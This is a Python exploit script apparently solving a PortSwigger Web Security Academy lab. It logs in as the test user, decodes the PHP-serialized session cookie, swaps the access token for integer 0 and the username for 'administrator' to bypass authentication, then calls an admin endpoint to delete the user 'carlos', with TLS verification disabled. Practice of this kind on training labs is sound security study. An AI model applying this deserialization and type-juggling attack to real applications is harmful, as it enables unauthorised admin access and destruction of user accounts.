import urllib.parse
import base64
import re
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# get cookie
url = "https://0a9e000d03e1d9edc0a659020018007e.web-security-academy.net/login"
values = {"username": "wiener", "password": "peter"}
r = requests.post(url, data=values, allow_redirects=False, verify=False)
cookie = r.cookies.get_dict()['session']



# base64, url encode and decode
url_decode = urllib.parse.unquote(cookie)
base64_d = base64.b64decode(url_decode)
deserialized = str(base64_d.decode())
access_token = re.sub(r's:32:"([a-zA-Z0-9]+)"', "i:0", deserialized)
name_replace = access_token.replace("wiener", "administrator")
name_number_repalce = name_replace.replace("6", "13")
serial_base64_encode = base64.b64encode(bytes(name_number_repalce, encoding="utf-8"))
serial_url_encode = urllib.parse.quote_plus(serial_base64_encode)
headers = {"cookie": "session="+serial_url_encode}


# exploit

r = requests.get("https://0a9e000d03e1d9edc0a659020018007e.web-security-academy.net/admin/delete?username=carlos", headers=headers, allow_redirects=False, verify=False)